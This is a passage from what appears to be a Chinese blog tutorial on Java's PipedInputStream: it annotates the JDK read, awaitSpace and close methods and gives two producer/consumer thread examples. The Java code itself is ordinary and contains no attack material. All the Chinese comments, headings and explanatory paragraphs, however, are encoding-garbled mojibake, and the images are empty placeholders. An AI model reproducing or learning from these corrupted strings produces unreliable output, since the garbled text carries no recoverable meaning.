IOException(\"Pipe closed\");\n        } else if (readSide != null &amp;&amp; !readSide.isAlive()) {\n            throw new IOException(\"Read end dead\");\n        }\n    }\n    \n    //å¦‚æœç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„è¯»æŒ‡é’ˆ==ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„å†™æŒ‡é’ˆï¼Œå”¤é†’æ‰€æœ‰æ¶ˆè´¹è€…çº¿ç¨‹ï¼Œè‡ªå·±è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹è°ƒç”¨wait(1000)å‡½æ•°\n    private void awaitSpace() throws IOException {\n        while (in == out) {\n            checkStateForReceive();\n\n            /* full: kick any waiting readers */\n            notifyAll();\n            try {\n                wait(1000);\n            } catch (InterruptedException ex) {\n                throw new java.io.InterruptedIOException();\n            }\n        }\n    }\n    //å…³é—­ä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰\n    synchronized void receivedLast() {\n        closedByWriter = true;\n        notifyAll();//å”¤é†’æ‰€æœ‰æ¶ˆè´¹è€…çº¿ç¨‹\n    }\n    //çº¿ç¨‹åŒæ­¥å‡½æ•°ï¼šæ¶ˆè´¹è€…çº¿ç¨‹æ¯æ¬¡ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å–1ä¸ªå­—èŠ‚\n    public synchronized int read()  throws IOException {\n        if (!connected) {//æ£€æŸ¥æ ‡è®°ç¬¦connectedï¼Œå¦‚æœä¸ºfalseï¼ŒæŠ›å‡ºIOException\n            throw new IOException(\"Pipe not connected\");\n        } else if (closedByReader) {//æ£€æŸ¥æ ‡è®°ç¬¦closedByReaderï¼Œå¦‚æœä¸ºtrueï¼ŒæŠ›å‡ºIOException\n            throw new IOException(\"Pipe closed\");\n        } else if (writeSide != null &amp;&amp; !writeSide.isAlive()\n                   &amp;&amp; !closedByWriter &amp;&amp; (in &lt; 0)) {\n           //æ£€æŸ¥å½“å‰è¿™ä¸ªPipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰å¯¹è±¡ä¸­å¼•ç”¨çš„ç”Ÿäº§è€…çº¿ç¨‹å’Œç”Ÿäº§è€…çº¿ç¨‹çš„çŠ¶æ€ï¼Œå¦‚æœå’Œæ ‡è®°ç¬¦closedByWriterè¿˜æœ‰ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„å†™æŒ‡é’ˆï¼ˆinï¼‰ä¸èƒ½å¯¹åº”çš„è¯ï¼ŒæŠ›å‡ºä¸€ä¸ªIOException\n            throw new IOException(\"Write end dead\");\n        }\n\n        readSide = Thread.currentThread();//å½“å‰æ‰§è¡Œè¯¥å‡½æ•°çš„çº¿ç¨‹ï¼Œå°±æ˜¯æ¶ˆè´¹è€…çº¿ç¨‹\n        int trials = 2;//è¿™æ˜¯ä¸€ä¸ªå¤šæ¬¡æ£€æµ‹çš„ç­–ç•¥å˜é‡ï¼Œé˜²æ­¢ç”Ÿäº§è€…çº¿ç¨‹æ²¡æœ‰å…³é—­äº†ä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰æ—¶ä¾¿æŠ›å‡ºIOException\n        //in=-1çš„æƒ…å†µæœ‰ç§ï¼š\n        //â‘ ã€ç”Ÿäº§è€…çº¿ç¨‹è¿˜æ²¡æœ‰å‘ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­å†™ä»»ä½•å­—èŠ‚\n        //â‘¡ã€æ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å®Œå­—èŠ‚ï¼ˆbyteï¼‰æ•°æ®ä»¥åè¯»æŒ‡é’ˆï¼ˆoutï¼‰=å†™æŒ‡é’ˆï¼ˆinï¼‰ï¼Œé‚£ä¹ˆï¼Œå½“å‰æ¶ˆè´¹è€…çº¿ç¨‹ä¼šè®¾ç½®å†™æŒ‡é’ˆï¼ˆinï¼‰=-1\n        //â‘¢ã€æ¶ˆè´¹è€…çº¿ç¨‹æ‰§è¡ŒPipedInputStream çš„close()å‡½æ•°åï¼Œå…³é—­äº†è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰\n        while (in &lt; 0) {\n            if (closedByWriter) {\n                /* closed by writer, return EOF */\n                return -1;\n            }\n            if ((writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)) {\n                //å¤šä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»çš„æ—¶å€™ï¼Œå¹¶ä¸”å‰ä¸€ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹å·²ç»æŠŠç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­å†™å…¥çš„å­—èŠ‚è¯»å®Œäº†ï¼Œå¹¶ä¸”å‰ä¸€ä¸ªçº¿ç¨‹è®¾ç½®äº†å†™æŒ‡é’ˆï¼ˆinï¼‰=-1ï¼Œç”Ÿäº§è€…çº¿ç¨‹ä¹Ÿå…³é—­äº†ä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰æ—¶ï¼ŒæŠ›å‡ºä¸€ä¸ªIOException\n                throw new IOException(\"Pipe broken\");\n            }\n            /* might be a writer waiting */\n            notifyAll();//æ­¤å¤„çš„ç›®çš„æ˜¯ä¸ºäº†å”¤é†’æ‰€æœ‰ç”Ÿäº§è€…çº¿ç¨‹\n            try {\n                wait(1000);\n            } catch (InterruptedException ex) {\n                throw new java.io.InterruptedIOException();\n            }\n        }\n        int ret = buffer[out++] &amp; 0xFF;//è·å–ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»æŒ‡é’ˆï¼ˆoutï¼‰ç´¢å¼•ä½ç½®çš„å­—èŠ‚,å¹¶ä¸”å°†è¯»æŒ‡é’ˆï¼ˆoutï¼‰+1\n        if (out &gt;= buffer.length) {\n            out = 0;//å¦‚æœè¯»æŒ‡é’ˆï¼ˆoutï¼‰&gt;=ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦ï¼Œè®¾ç½®è¯»æŒ‡é’ˆï¼ˆoutï¼‰=0\n        }\n        if (in == out) {\n            /* now empty */\n            in = -1;//å¦‚æœæ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å®Œå­—èŠ‚ï¼ˆbyteï¼‰æ•°æ®ä»¥åè¯»æŒ‡é’ˆï¼ˆoutï¼‰=å†™æŒ‡é’ˆï¼ˆinï¼‰ï¼Œé‚£ä¹ˆï¼Œå½“å‰æ¶ˆè´¹è€…çº¿ç¨‹ä¼šè®¾ç½®å†™æŒ‡é’ˆï¼ˆinï¼‰=-1\n        }\n\n        return ret;\n    }\n\n    //çº¿ç¨‹åŒæ­¥å‡½æ•°ï¼šå¦‚æœç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­æœ‰è¶³å¤Ÿå¤šçš„å­—èŠ‚çš„è¯ï¼ˆæ•°é‡&gt;lenï¼‰ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹æ¯æ¬¡ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å–lenä¸ªå­—èŠ‚æ”¾åˆ°byte[]æ•°ç»„bçš„[off, off+len)ç´¢å¼•ä½ç½®ï¼ˆå·¦é—­å³å¼€ï¼Œä¸åŒ…æ‹¬off+lenï¼‰\n    //å¦‚æœç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­å­—èŠ‚çš„æ•°é‡&lt;lenä¸ªï¼ˆæ¯”å¦‚æœ‰inï¼ˆå†™æŒ‡é’ˆï¼‰-outï¼ˆè¯»æŒ‡é’ˆï¼‰ä¸ªï¼‰ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹æ¯æ¬¡ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å–ï¼ˆin-outï¼‰ä¸ªå­—èŠ‚æ”¾åˆ°byte[]æ•°ç»„bçš„[off, off+in-out)ç´¢å¼•ä½ç½®ï¼ˆå·¦é—­å³å¼€ï¼Œä¸åŒ…æ‹¬off+in-outï¼‰\n    public synchronized int read(byte b[], int off, int len)  throws IOException {\n        if (b == null) {\n            throw new NullPointerException();\n        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//byte[]æ•°ç»„bçš„[off,off+len)ï¼ˆå·¦é—­å³å¼€ï¼‰ç´¢å¼•ä½ç½®æ˜¯å¦æœ‰è¶Šç•Œçš„æ£€æŸ¥\n            throw new IndexOutOfBoundsException();//è¶Šç•Œçš„è¯ï¼ŒæŠ›å‡ºä¸€ä¸ªIndexOutOfBoundsException\n        } else if (len == 0) {\n            return 0;//å¦‚æœlen==0ï¼Œè¿”å›0\n        }\n\n        /* possibly wait on the first character */\n        int c = read();//å…ˆè°ƒç”¨read()å‡½æ•°è¯•æ¢æ€§ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»1ä¸ªå­—èŠ‚\n        if (c &lt; 0) {\n            return -1;//å¦‚æœè¯•æ¢æ€§çš„ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­éƒ½è¯»ä¸åˆ°1ä¸ªå­—èŠ‚ï¼Œè¿”å›-1\n        }\n        b[off] = (byte) c;//æŠŠè¯•æ¢æ€§ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°çš„ç¬¬1ä¸ªå­—èŠ‚æ”¾åˆ°byte[]æ•°ç»„bçš„offç´¢å¼•ä½ç½®\n        int rlen = 1;//ç´¯è®¡ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°çš„æ‰€æœ‰å­—èŠ‚æ•°é‡\n        while ((in &gt;= 0) &amp;&amp; (len &gt; 1)) {\n\n            int available;//æœ¬æ¬¡æ‰§è¡ŒSystem.arraycopy()å‡½æ•°å¯ä»¥ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°byte[]æ•°ç»„bä¸­çš„å­—èŠ‚æ•°é‡\n\n            if (in &gt; out) {\n                available = Math.min((buffer.length - out), (in - out));\n            } else {\n                available = buffer.length - out;\n            }\n\n            // A byte is read beforehand outside the loop\n            if (available &gt; (len - 1)) {//å‡æ‰è¯•æ¢æ€§ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°çš„ç¬¬1ä¸ªå­—èŠ‚\n                available = len - 1;\n            }\n            System.arraycopy(buffer, out, b, off + rlen, available);\n            out += available;//è¯»æŒ‡é’ˆï¼ˆoutï¼‰+System.arraycopy()å‡½æ•°ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°byte[]æ•°ç»„bä¸­çš„å­—èŠ‚æ•°é‡\n            rlen += available;//ç´¯è®¡ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°çš„æ‰€æœ‰å­—èŠ‚æ•°é‡ + System.arraycopy()å‡½æ•°ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°byte[]æ•°ç»„bä¸­çš„å­—èŠ‚æ•°é‡\n            len -= available;//len - System.arraycopy()å‡½æ•°ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°byte[]æ•°ç»„bä¸­çš„å­—èŠ‚æ•°é‡\n\n            if (out &gt;= buffer.length) {\n                out = 0;//å¦‚æœè¯»æŒ‡é’ˆï¼ˆoutï¼‰&gt;=ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„é•¿åº¦ï¼Œè®¾ç½®è¯»æŒ‡é’ˆï¼ˆoutï¼‰=0\n            }\n            if (in == out) {\n                /* now empty */\n                in = -1;//å¦‚æœæ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å®Œå­—èŠ‚ï¼ˆbyteï¼‰æ•°æ®ä»¥åè¯»æŒ‡é’ˆï¼ˆoutï¼‰=å†™æŒ‡é’ˆï¼ˆinï¼‰ï¼Œé‚£ä¹ˆï¼Œå½“å‰æ¶ˆè´¹è€…çº¿ç¨‹ä¼šè®¾ç½®å†™æŒ‡é’ˆï¼ˆinï¼‰=-1\n            }\n        }\n        return rlen;//è¿”å›ç´¯è®¡ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»åˆ°çš„æ‰€æœ‰å­—èŠ‚æ•°é‡\n    }\n    \n    //çº¿ç¨‹åŒæ­¥å‡½æ•°ï¼šè¿”å›ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­å¯ä»¥è¢«æ¶ˆè´¹è€…çº¿ç¨‹è¯»å–çš„å­—èŠ‚æ•°é‡\n    public synchronized int available() throws IOException {\n        if(in &lt; 0)\n            return 0;\n        else if(in == out)\n            return buffer.length;\n        else if (in &gt; out)\n            return in - out;\n        else\n            return in + buffer.length - out;\n    }\n    \n    //å…³é—­è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ï¼Œå…¶å®å°±æ˜¯è®¾ç½®æ ‡è®°ç¬¦closedByReader=trueï¼Œ è®¾ç½®å†™æŒ‡é’ˆï¼ˆinï¼‰=-1\n    public void close()  throws IOException {\n        closedByReader = true;\n        synchronized (this) {\n            in = -1;\n        }\n    }\n}\n</code></pre>\n<h4 id=\"ä¸‰1ä¸ªçº¿ç¨‹å‘pipedoutputstreamç”Ÿäº§è€…å†™å­—èŠ‚æ•°æ®1ä¸ªçº¿ç¨‹ä»pipedinputstreamæ¶ˆè´¹è€…è¯»å–å­—èŠ‚æ•°æ®çš„è¿‡ç¨‹\">ä¸‰ã€1ä¸ªçº¿ç¨‹å‘PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å†™å­—èŠ‚æ•°æ®ï¼Œ1ä¸ªçº¿ç¨‹ä»PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰è¯»å–å­—èŠ‚æ•°æ®çš„è¿‡ç¨‹</h4>\n<h5 id=\"31éå¾ªç¯ç›´æ¥å†™å’Œéå¾ªç¯ç›´æ¥è¯»\">3.1ã€éå¾ªç¯ç›´æ¥å†™å’Œéå¾ªç¯ç›´æ¥è¯»</h5>\n<pre><code>package com.chelong.StreamAndReader;\n\nimport java.io.IOException;\nimport java.io.PipedInputStream;\nimport java.io.PipedOutputStream;\n\npublic class PipedTest {\n   public static void main(String[] args) throws IOException {\n      final PipedOutputStream output = new PipedOutputStream();\n      final PipedInputStream input = new PipedInputStream(output);\n      Thread thread1 = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               output.write(\"Hello world, pipe!\".getBytes());//write()å‡½æ•°æ˜¯é˜»å¡çš„\n            } catch (IOException e) {\n            }\n         }\n      });\n\n      Thread thread2 = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               int data = -1;\n               while ((data = input.read()) != -1) {//read()å‡½æ•°æ˜¯é˜»å¡çš„\n                  System.out.print((char) data);\n               }\n            } catch (IOException e) {\n            }\n         }\n      });\n\n      thread1.start();\n      thread2.start();\n   }\n}\n</code></pre>\n<p>ç¨‹åºè¿è¡Œç»“æœï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â€ƒâ€ƒmainçº¿ç¨‹æ„é€ PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å’ŒPipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â€ƒâ€ƒå‘PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å†™å­—èŠ‚æ•°æ®çš„ç”Ÿäº§è€…çº¿ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p>\n<p><img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â€ƒâ€ƒä»PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰è¯»å–å­—èŠ‚æ•°æ®çš„æ¶ˆè´¹è€…çº¿ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"311éå¾ªç¯ç›´æ¥å†™å’Œéå¾ªç¯ç›´æ¥è¯»æ—¶1ä¸ªç”Ÿäº§è€…çº¿ç¨‹å’Œ1ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹å¤„ç†æ•°æ®çš„è¿‡ç¨‹\">3.1.1ã€éå¾ªç¯ç›´æ¥å†™å’Œéå¾ªç¯ç›´æ¥è¯»æ—¶1ä¸ªç”Ÿäº§è€…çº¿ç¨‹å’Œ1ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹å¤„ç†æ•°æ®çš„è¿‡ç¨‹</h6>\n<p>â€ƒâ€ƒJava è¯­è¨€å®šä¹‰äº† 6 ç§çº¿ç¨‹çŠ¶æ€, åœ¨ä»»æ„ä¸€ä¸ªæ—¶é—´ç‚¹, ä¸€ä¸ªçº¿ç¨‹åªèƒ½æœ‰ä¸”åªæœ‰å…¶ä¸­çš„ä¸€ç§çŠ¶æ€, è¿™ 6 ç§çŠ¶æ€åˆ†åˆ«å¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>è¿™ 6 ç§çº¿ç¨‹çŠ¶æ€çš„ç®€å•ä»‹ç»ï¼Œå¦‚ä¸‹æ‰€ç¤º<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â€ƒâ€ƒJVMè¿è¡Œæ—¶å†…å­˜ç»“æ„ä¸»è¦åŒ…å«äº†äº”ä¸ªéƒ¨åˆ†ï¼šç¨‹åºè®¡æ•°å™¨ ï¼ˆPCå¯„å­˜å™¨ï¼‰ã€ JVMæ ˆã€Nativeæ–¹æ³•æ ˆã€å †ã€ æ–¹æ³•åŒºã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>å›¾ä¸­çº¢è‰²éƒ¨åˆ†æ˜¯çº¿ç¨‹ç§æœ‰åŒºåŸŸï¼Œè¿›å…¥è¿™ä¸ªåŒºåŸŸçš„æ•°æ®ä¸ä¼šå‡ºç°çº¿ç¨‹ç«äº‰çš„å…³ç³»ã€‚è€Œç»¿è‰²åŒºåŸŸä¸­çš„æ•°æ®åˆ™è¢«æ‰€æœ‰çº¿ç¨‹å…±äº«ï¼Œå…¶ä¸­Javaå †ä¸­å­˜æ”¾çš„æ˜¯å¤§é‡å¯¹è±¡ï¼Œæ–¹æ³•åŒºä¸­å­˜æ”¾classä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰æ•°æ®ã€‚<br />\nâ€ƒâ€ƒæ¯ä¸ªçº¿ç¨‹çš„çº¿ç¨‹æ ˆä¸­ä¼šå­˜æ”¾å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰çš„æè¿°ç¬¦ï¼Œæˆå‘˜ï¼ˆæœ¬åœ°ï¼‰å˜é‡ç­‰ï¼Œå‡½æ•°ï¼ˆæ–¹æ³•ï¼‰åœ¨çº¿ç¨‹æ ˆä¸­ä¼šé€šè¿‡å‹æ ˆå’Œå¼¹æ ˆæ¥æ‰§è¡Œï¼Œé™¤äº†8ç§ï¼ˆbyteã€shortã€intã€longã€floatã€doubleã€booleanã€charï¼‰åŸºæœ¬çš„æ•°æ®ç±»å‹å­˜å‚¨åœ¨çº¿ç¨‹æ ˆä¸­ä»¥å¤–ï¼Œå…¶ä½™çš„å¼•ç”¨æ•°æ®ç±»å‹ï¼ˆå¯¹è±¡ï¼‰éƒ½å­˜å‚¨åœ¨å †ä¸­ï¼Œç„¶åé€šè¿‡å¼•ç”¨å°†å †ä¸­çš„å¯¹è±¡å’Œçº¿ç¨‹æ ˆä¸­çš„å˜é‡å…³è”èµ·æ¥ï¼ˆä¹Ÿå¯ä»¥å«çº¿ç¨‹æ ˆä¸­çš„å¼•ç”¨æŒ‡å‘å †ä¸­çš„å¯¹è±¡ï¼‰ã€‚<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>é‚£ä¹ˆï¼Œå½“ä½¿ç”¨è€…æ‰§è¡Œ3.1ä¸­çš„ä»£ç æ—¶ï¼Œ1ä¸ªç”Ÿäº§è€…çº¿ç¨‹å’Œ1ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹å¤„ç†æ•°æ®çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š<br />\nâ‘ ã€mainçº¿ç¨‹åˆå§‹åŒ–ä¸€ä¸ªç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ï¼Œé•¿åº¦ä¸º1024ï¼ˆé»˜è®¤å€¼ï¼‰ï¼Œç„¶åç”Ÿäº§è€…çº¿ç¨‹é€šè¿‡ä¸æ–­çš„å‹æ ˆæ¥å®Œæˆå‡½æ•°ä¹‹é—´çš„è°ƒç”¨ï¼Œæœ€ç»ˆæ‰§è¡ŒPipedInputStream.class::receive(byte b[], int off, int len)å‡½æ•°æ¥å¯¹ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰è¿›è¡Œå¡«å……ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘¡ã€å½“ç”Ÿäº§è€…çº¿ç¨‹å¡«å……å®Œç¼“å†²åŒºä¹‹åï¼Œå†™æŒ‡é’ˆå˜é‡int in=17ï¼Œè¯»æŒ‡é’ˆå˜é‡int out=0ï¼ŒThread writeSide = å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ï¼ˆThreadï¼‰å¯¹è±¡ï¼Œç”Ÿäº§è€…çº¿ç¨‹ä¼šæŠŠè‡ªå·±çº¿ç¨‹æ ˆä¸­ä¿®æ”¹çš„å˜é‡æœ€ç»ˆåˆ·æ–°åˆ°å †ä¸­PipedInputStreamå¯¹è±¡ä¸­ï¼Œä»¥ç¡®ä¿å…¶å®ƒæ¶ˆè´¹è€…çº¿ç¨‹çš„çº¿ç¨‹æ ˆä»å †ä¸­è¯»å–è¿™3ä¸ªå˜é‡æ—¶ï¼Œè¿™3ä¸ªå˜é‡å·²ç»ä¸ºä¿®æ”¹åçš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘¢ã€æ¶ˆè´¹è€…çº¿ç¨‹è¯»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„è¿‡ç¨‹ä¸­ä¼šä¸æ–­åœ°æ‰§è¡Œout++ï¼ˆè¯»æŒ‡é’ˆï¼‰ä»¥è¯»å–ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„å¯ç”¨å­—èŠ‚å¹¶è¿”å›ï¼Œç›´åˆ°outï¼ˆè¯»æŒ‡é’ˆï¼‰==inï¼ˆå†™æŒ‡é’ˆï¼‰ï¼Œä¿®æ”¹inï¼ˆå†™æŒ‡é’ˆï¼‰=-1ï¼Œå¹¶ä¸”æ¯æ¬¡åŒæ­¥æ‰§è¡ŒPipedInputStream.class::read()å‡½æ•°æ—¶ï¼Œéƒ½ä¼šæ›´æ–°Thread readSide = å½“å‰è¿™ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ï¼ˆThreadï¼‰å¯¹è±¡ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¹Ÿä¼šæŠŠè‡ªå·±çº¿ç¨‹æ ˆä¸­ä¿®æ”¹çš„å˜é‡æœ€ç»ˆåˆ·æ–°åˆ°å †ä¸­PipedInputStreamå¯¹è±¡ä¸­ï¼Œä»¥ç¡®ä¿å…¶å®ƒæ¶ˆè´¹è€…çº¿ç¨‹çš„çº¿ç¨‹æ ˆä»å †ä¸­è¯»å–è¿™3ä¸ªå˜é‡æ—¶ï¼Œè¿™3ä¸ªå˜é‡å·²ç»ä¸ºä¿®æ”¹åçš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘£ã€æ›´æ–°inï¼ˆå†™æŒ‡é’ˆï¼‰=-1åï¼Œæ¶ˆè´¹è€…çº¿ç¨‹å†æ¬¡åŒæ­¥æ‰§è¡ŒPipedInputStream.class::read()å‡½æ•°æ—¶ï¼Œå¦‚æœPipedInputStream::boolean closedByWriterå˜é‡ä¸ºtrueï¼Œåˆ™ä¼šè¿”å›-1</p>\n<h5 id=\"32åŠ é”å¾ªç¯å†™å’ŒéåŠ é”å¾ªç¯è¯»åˆ°byteæ•°ç»„bä¸­å†å¤„ç†\">3.2ã€åŠ é”å¾ªç¯å†™å’ŒéåŠ é”å¾ªç¯è¯»åˆ°byte[]æ•°ç»„bä¸­å†å¤„ç†</h5>\n<pre><code>package com.chelong.pipe;\nimport java.io.IOException;\nimport java.io.PipedInputStream;\nimport java.io.PipedOutputStream;\n\npublic class PipeForTransferInThread {\n   public static void main(String[] args) throws IOException, InterruptedException {\n      final PipedOutputStream output = new PipedOutputStream();\n      final PipedInputStream input = new PipedInputStream(output);\n      //ç”Ÿäº§è€…çº¿ç¨‹\n      Thread producer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            for (int i = 0; i &lt; 3; i++) {\n               synchronized (input) {\n                  try {\n//                    input.wait();\n                     output.write(\"Hello world, pipe!\".getBytes());\n                     input.wait();//é‡Šæ”¾é”å¹¶æ— é™ç­‰å¾…ï¼Œç›´åˆ°æ¶ˆè´¹è€…çº¿ç¨‹consumer æ‰§è¡ŒnotifyAll()å‡½æ•°æ¥å”¤é†’å½“å‰é˜»å¡\n                  } catch (Exception e) {\n                     e.printStackTrace();\n                  }\n               }\n            }\n         }\n      },\"ç”Ÿäº§è€…çº¿ç¨‹\");\n      \n      //æ¶ˆè´¹è€…çº¿ç¨‹\n      Thread consumer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               byte[] b = new byte[1024];//1KB\n               int readBytes = -1;\n               long lastTime = System.currentTimeMillis();\n               while ((readBytes = input.read(b, 0, b.length)) != -1) {\n                  long curTime = System.currentTimeMillis();\n                  System.out.print(Thread.currentThread().getName()+\"æœ¬æ¬¡è¯»å–èŠ±è´¹æ—¶é—´ï¼š\" + (curTime - lastTime) + \"msï¼Œè¯»åˆ°çš„æ•°æ®æ˜¯ï¼š\");\n                  lastTime = curTime;\n                  for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//æ¨¡æ‹Ÿå¤„ç†å­—èŠ‚æ•°æ®\n                  }\n                  System.out.println();\n               }\n            } catch (IOException e) {\n               e.printStackTrace();\n            }\n         }\n      },\"æ¶ˆè´¹è€…çº¿ç¨‹\");\n      producer.start();//ç”Ÿäº§è€…çº¿ç¨‹å¯åŠ¨\n      consumer.start();//æ¶ˆè´¹è€…çº¿ç¨‹å¯åŠ¨\n   }\n}\n</code></pre>\n<p>ç¨‹åºè¿è¡Œç»“æœï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â€ƒâ€ƒmainçº¿ç¨‹æ„é€ PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å’ŒPipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰çš„è¿‡ç¨‹å¯ä»¥å‚è€ƒ3.1ï¼›<br />\nâ€ƒâ€ƒå‘PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å†™å­—èŠ‚æ•°æ®çš„ç”Ÿäº§è€…çº¿ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹å¯ä»¥å‚è€ƒ3.1ï¼›<br />\nâ€ƒâ€ƒä»PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰è¯»å–å­—èŠ‚æ•°æ®çš„æ¶ˆè´¹è€…çº¿ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"321åŠ é”å¾ªç¯å†™å’ŒéåŠ 